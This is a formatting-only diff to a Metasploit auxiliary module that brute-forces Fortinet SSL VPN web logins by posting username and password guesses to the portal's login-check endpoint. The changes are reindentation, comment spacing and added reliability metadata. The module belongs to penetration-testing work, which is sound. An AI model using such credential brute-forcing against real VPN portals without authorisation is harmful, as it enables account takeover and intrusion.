@@ -9,26 +9,34 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::AuthBrute
   include Msf::Auxiliary::Scanner
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => 'Fortinet SSL VPN Bruteforce Login Utility',
-      'Description'    => %{
-        This module scans for Fortinet SSL VPN web login portals and
-        performs login brute force to identify valid credentials.
-      },
-      'Author'         => [ 'Max Michels <kontakt[at]maxmichels.de>' ],
-      'License'        => MSF_LICENSE,
-      'DefaultOptions' =>
-        {
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Fortinet SSL VPN Bruteforce Login Utility',
+        'Description' => %q{
+          This module scans for Fortinet SSL VPN web login portals and
+          performs login brute force to identify valid credentials.
+        },
+        'Author' => [ 'Max Michels <kontakt[at]maxmichels.de>' ],
+        'License' => MSF_LICENSE,
+        'DefaultOptions' => {
           'SSL' => true,
           'RPORT' => 443
+        },
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
         }
-    ))
+      )
+    )
 
     register_options(
       [
         OptString.new('DOMAIN', [false, "Domain/Realm to use for each account", ''])
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
@@ -120,12 +128,12 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       post_params = {
-        'ajax'  => '1',
+        'ajax' => '1',
         'username' => user,
         'credential' => pass
       }
 
-      #check to use domain/realm or not
+      # check to use domain/realm or not
       if datastore['DOMAIN'].nil? || datastore['DOMAIN'].empty?
         post_params['realm'] = ""
       else
@@ -133,11 +141,11 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       res = send_request_cgi(
-              'uri' => '/remote/logincheck',
-              'method' => 'POST',
-              'ctype' => 'application/x-www-form-urlencoded',
-              'vars_post' => post_params
-            )
+        'uri' => '/remote/logincheck',
+        'method' => 'POST',
+        'ctype' => 'application/x-www-form-urlencoded',
+        'vars_post' => post_params
+      )
 
       if res &&
          res.code == 200 &&
@@ -160,7 +168,6 @@ class MetasploitModule < Msf::Auxiliary
       else
         vprint_error("FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
       end
-
     rescue ::Rex::ConnectionRefused,
            ::Rex::HostUnreachable,
            ::Rex::ConnectionTimeout,
